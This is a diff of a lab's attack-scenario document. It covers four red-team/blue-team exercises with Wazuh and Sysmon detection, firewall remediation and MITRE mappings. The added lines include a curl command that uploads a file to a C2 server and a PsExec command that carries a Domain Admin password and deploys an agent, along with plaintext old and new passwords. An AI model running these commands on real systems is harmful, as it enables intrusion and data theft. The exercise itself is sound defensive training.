@@ -1,6 +1,12 @@
 # Planned Attack Scenarios
 
-This document outlines 4 attack scenarios following the Attack -> Detect -> Fix -> Verify methodology.
+This document outlines the attack scenarios executed during Phase 1 (Baseline/Weak Security) following the Attack → Detect → Fix → Verify methodology.
+
+**Based on:**
+- Red Team actual execution (see: `red-team-attack-plan-phase1.md`)
+- Blue Team remediation steps (see: `blue-team-post-attack-remediation.md`)
+
+**Attack Flow:** Initial Access (SSH) → Credential Hunting → Privilege Escalation → Lateral Movement (PsExec/SMB) → Data Exfiltration → Cleanup
 
 ---
 
@@ -10,8 +16,10 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 
 ### Attack (Red Team)
 
-- CALDERA attempts an SSH login as `webadmin` on the Linux server.
-- Because `webadmin` has **no password set**, the login succeeds immediately on the first attempt.
+- CALDERA agent established foothold on Linux server (10.10.0.51) as user `vbubuntu`.
+- Red Team attempts SSH login as `webadmin` on the Linux server.
+- Because `webadmin` has **no password set**, the login succeeds immediately.
+- **Additional noise generation:** Manual brute force attempts (PAM authentication failures) to stress-test Wazuh detection rules.
 
 ### Detection (Wazuh SIEM)
 
@@ -22,8 +30,13 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 ### Response / Remediation (Blue Team)
 
 - Firewall is not used here (internal traffic).
-- Connect to Linux and change the password to a strong passphrase.
-- (Additional) Disable `PermitRootLogin` in `/etc/ssh/sshd_config`.
+- Connect to Linux and change the password to a strong passphrase (`W3bAdm1nS3cure2025!`).
+- **Harden SSH configuration** in `/etc/ssh/sshd_config`:
+  - `PermitRootLogin no`
+  - `MaxAuthTries 3`
+  - `PermitEmptyPasswords no`
+  - `LoginGraceTime 60`
+- Restart SSH service to apply changes.
 - **Technology:** OS Hardening & Password Policy.
 
 ### Verification
@@ -40,22 +53,24 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 
 ### Attack (Red Team)
 
-- Malware is simulated on the Windows Workstation attempting to send "stolen data" to an external server (e.g., HTTP request to a public IP address or pastebin.com).
-- Simulated PowerShell command:
-  ```powershell
-  Invoke-WebRequest -Uri "http://suspicious-site.com/data"
+- CALDERA agent running on Windows Workstation creates a test file to simulate data theft.
+- Attacker generates `C:\Users\Public\Exfil_Proof.txt` with content "HACKED BY RED TEAM".
+- Attacker uses `curl` (native CMD tool) to exfiltrate data to C2 server:
+  ```cmd
+  echo "HACKED BY RED TEAM" > C:\Users\Public\Exfil_Proof.txt && curl -F "data=@C:\Users\Public\Exfil_Proof.txt" http://10.10.0.53:8888/file/upload
   ```
+- **Note:** PowerShell `Invoke-WebRequest` was initially planned but caused errors during execution.
 
 ### Detection (Wazuh & Sysmon)
 
 - Wazuh (with Sysmon) logs Event ID 1 (Process Create) and Event ID 3 (Network Connection).
-- Visible in dashboard: PowerShell process opening a connection to an external IP.
+- Visible in dashboard: `curl.exe` process opening a connection to C2 server (10.10.0.53:8888).
 - **Technology:** Sysmon + Wazuh.
 
 ### Response / Remediation (pfSense)
 
-- Decision to "isolate" the infected machine from the Internet.
-- Add rule at the top to block ouside access.
+- Decision to block communication between infected machine (10.10.0.50) and C2 server (10.10.0.53).
+- Add pfSense rule at the top: Block TCP from 10.10.0.50 to 10.10.0.53 port 8888.
 - **Technology:** pfSense Firewall Rules.
 
 ### Verification
@@ -72,6 +87,7 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 ### Attack (Red Team)
 
 - Attacker is already on Linux (as `webadmin`).
+- **Credential Hunting:** Discovers hardcoded credentials in `/tmp/db_config.py` containing `admin_lab` Domain Admin password.
 - Types `sudo cat /etc/shadow` and obtains password hashes without entering a password (due to `NOPASSWD` in sudoers file).
 - Modifies a system file (e.g., adds a new cron job).
 
@@ -85,11 +101,15 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 
 - Remove `NOPASSWD` from `/etc/sudoers`.
 - Restore the original cron file.
-- **Technology:** OS Configuration.
+- **Delete credential file:** Remove `/tmp/db_config.py` containing hardcoded passwords.
+- **Rotate compromised credentials:** Change password for `admin_lab` Domain Admin account.
+- **Technology:** OS Configuration & Credential Management.
 
 ### Verification
 
-- Attacker types `sudo ...`. System prompts for password. **Attack stopped.**
+- Attacker types `sudo cat /etc/shadow`. System prompts for password. **Attack stopped.**
+- Credential file `/tmp/db_config.py` no longer exists (returns "No such file").
+- Old `admin_lab` password (`Administrator1209!!`) no longer works (rotated to `Adm1nL4bS3cure2025!`).
 
 ---
 
@@ -99,24 +119,37 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 
 ### Attack (Red Team)
 
-- CALDERA (`.53`) attempts to scan ports or connect via RDP to Windows (`.50`).
-- Since Windows Firewall is disabled (as defined in Phase 0), the scan succeeds.
+- **Ingress Tool Transfer:** Attacker downloads Impacket tools (`psexec.py`) to the compromised Linux server using `wget`.
+- **Failed lateral movement attempt:** First attempt using `employee` credentials fails (no admin privileges).
+- **Credential hunting:** Discovers `/tmp/db_config.py` containing `admin_lab` Domain Admin credentials.
+- Using stolen `admin_lab` credentials, attacker executes **PsExec** from Linux (`.51`) to Windows (`.50`) via **SMB protocol (port 445)**.
+- Command: `python3 psexec.py 'TECHNOVA/admin_lab:Administrator1209!!@10.10.0.50' "C:\Users\Public\splunkd.exe -server http://10.10.0.53:8888 -group red"`
+- Since Windows Firewall is disabled (as defined in Phase 0), the lateral movement succeeds.
+- CALDERA agent (`splunkd.exe`) is deployed on Windows as SYSTEM.
 
 ### Detection (Wazuh)
 
-- Visible in dashboard: Wazuh alert `Windows Logon Failure` (if guessing passwords) or Inbound Traffic logs if enabled.
-- **Technology:** Wazuh.
+- Visible in dashboard: Wazuh alerts for SMB connections (port 445) and suspicious service creation (`splunkd.exe`).
+- Sysmon logs Process Creation (Event ID 1) and Network Connection (Event ID 3) from remote IP.
+- Windows Event Logs show Logon Type 3 (Network Logon) as Domain Admin.
+- **Technology:** Wazuh + Sysmon + Windows Event Logs.
 
 ### Response / Remediation (Windows Firewall)
 
-- Conclusion: `10.10.0.53` (CALDERA) should not communicate with the Windows client.
+- Conclusion: `10.10.0.53` (CALDERA) and `10.10.0.51` (compromised Linux) should not communicate with the Windows client.
 - Enable Windows Defender Firewall.
-- Create Inbound rule: `Block IP 10.10.0.53`.
-- **Technology:** Host-based Firewall.
+- Create Inbound rules:
+  - Block all traffic from `10.10.0.53` (CALDERA C2)
+  - Block SMB (port 445) from `10.10.0.51` (Linux server)
+  - Block RPC (port 135) and WMI (ports 5985/5986) from external hosts
+- **Cleanup artifacts:** Remove `splunkd.exe` (CALDERA agent) and Impacket tools (`psexec.py`) from both systems.
+- **Technology:** Host-based Firewall & Artifact Removal.
 
 ### Verification
 
-- CALDERA attempts to ping or RDP. Receives **"Request Timed Out"**.
+- Attacker attempts PsExec lateral movement via SMB. Connection to port 445 is **blocked by Windows Firewall**.
+- CALDERA C2 communication fails. Agent cannot reconnect.
+- Old `admin_lab` credentials no longer work (password rotated).
 
 ---
 
@@ -124,10 +157,10 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 
 | Scenario | Attack | Detection (Wazuh) | Defense / Tool |
 |----------|--------|-------------------|----------------|
-| 1. Brute Force | SSH Login | Log Analysis (Auth Fail/Success) | Strong Passwords (OS) |
-| 2. C2 / Exfil | Web Request | Sysmon (Process + Network Conn) | pfSense Firewall (Block WAN) |
-| 3. Priv Esc | Sudo Abuse | FIM (File Change) + Sudo Logs | Config Fix (Sudoers) |
-| 4. Lat. Move | RDP/Scan | Security Events (RDP + Scan) | Windows Firewall (Host FW) |
+| 1. Brute Force | SSH Login (webadmin) | Log Analysis (Auth Fail/Success) | Strong Passwords + SSH Hardening |
+| 2. C2 / Exfil | curl.exe Upload | Sysmon (Process + Network Conn) | pfSense Firewall (Block C2) |
+| 3. Priv Esc | Sudo Abuse + Cred Hunting | FIM (File Change) + Sudo Logs | Config Fix + Cred Rotation |
+| 4. Lat. Move | PsExec/SMB (port 445) + Agent Deploy | Sysmon (Service + SMB Conn) | Windows Firewall (Block SMB) |
 
 ---
 
@@ -145,7 +178,7 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 | **Vulnerability** | No password |
 | **Wazuh Detection Rules** | 5710, 5715, 100001, 100002 |
 | **Detection Method** | Log Analysis - Authentication failures/success |
-| **Remediation** | Change password to strong passphrase |
+| **Remediation** | Change password to `W3bAdm1nS3cure2025!` + SSH hardening (MaxAuthTries 3, PermitRootLogin no) |
 | **Defense Layer** | OS Hardening |
 
 ---
@@ -159,8 +192,8 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 | **MITRE Sub-technique** | T1071.001 - Web Protocols |
 | **Additional Technique** | T1041 - Exfiltration Over C2 Channel |
 | **Target** | Windows Workstation (10.10.0.50) |
-| **Attack Vector** | PowerShell HTTP request |
-| **Vulnerability** | No outbound traffic filtering |
+| **Attack Vector** | curl.exe HTTP POST to C2 (10.10.0.53:8888) |
+| **Vulnerability** | No outbound traffic filtering to C2 server |
 | **Wazuh Detection Rules** | 100020, 100021, 100023 |
 | **Detection Method** | Sysmon Event ID 1 (Process) + Event ID 3 (Network) |
 | **Remediation** | pfSense block rule for infected host |
@@ -172,16 +205,16 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 
 | Category | Details |
 |----------|---------|
-| **MITRE Tactic** | Privilege Escalation / Persistence |
+| **MITRE Tactic** | Privilege Escalation / Credential Access |
 | **MITRE Technique** | T1548 - Abuse Elevation Control Mechanism |
 | **MITRE Sub-technique** | T1548.003 - Sudo and Sudo Caching |
-| **Additional Technique** | T1053.003 - Scheduled Task/Job: Cron |
+| **Additional Technique** | T1552.001 - Credentials In Files, T1053.003 - Cron |
 | **Target** | Linux Server (10.10.0.51) |
-| **Attack Vector** | sudo with NOPASSWD misconfiguration |
-| **Vulnerability** | `webadmin ALL=(ALL) NOPASSWD: ALL` in sudoers |
+| **Attack Vector** | Credential hunting + sudo NOPASSWD abuse |
+| **Vulnerability** | Hardcoded credentials in `/tmp/db_config.py` + `NOPASSWD` in sudoers |
 | **Wazuh Detection Rules** | 100011, 100012, 100040, 100041 |
 | **Detection Method** | FIM - File Integrity Monitoring on /etc/crontab + sudo command logs |
-| **Remediation** | Remove NOPASSWD from /etc/sudoers |
+| **Remediation** | Remove NOPASSWD + Delete credential file + Rotate `admin_lab` password |
 | **Defense Layer** | OS Configuration |
 
 ---
@@ -192,14 +225,14 @@ This document outlines 4 attack scenarios following the Attack -> Detect -> Fix 
 |----------|---------|
 | **MITRE Tactic** | Lateral Movement / Discovery |
 | **MITRE Technique** | T1021 - Remote Services |
-| **MITRE Sub-technique** | T1021.001 - Remote Desktop Protocol |
-| **Additional Technique** | T1046 - Network Service Discovery |
+| **MITRE Sub-technique** | T1021.002 - SMB/Windows Admin Shares |
+| **Additional Technique** | T1105 - Ingress Tool Transfer (Impacket), T1046 - Network Discovery |
 | **Target** | Windows Workstation (10.10.0.50) |
-| **Attack Vector** | Port scan + RDP from CALDERA (10.10.0.53) |
-| **Vulnerability** | Windows Firewall disabled |
-| **Wazuh Detection Rules** | 100050, 100051 |
-| **Detection Method** | Windows Security Events - Logon failures |
-| **Remediation** | Enable Windows Firewall + Block rule for attacker IP |
+| **Attack Vector** | PsExec via SMB (port 445) using stolen `admin_lab` credentials |
+| **Vulnerability** | Windows Firewall disabled + Hardcoded Domain Admin credentials |
+| **Wazuh Detection Rules** | 100050, 100051, Sysmon Event 1, 3 |
+| **Detection Method** | SMB connections + Service creation + Network Logon (Type 3) |
+| **Remediation** | Enable Windows Firewall + Block SMB/RPC + Rotate credentials + Remove artifacts |
 | **Defense Layer** | Host-based Firewall |
 
 ---
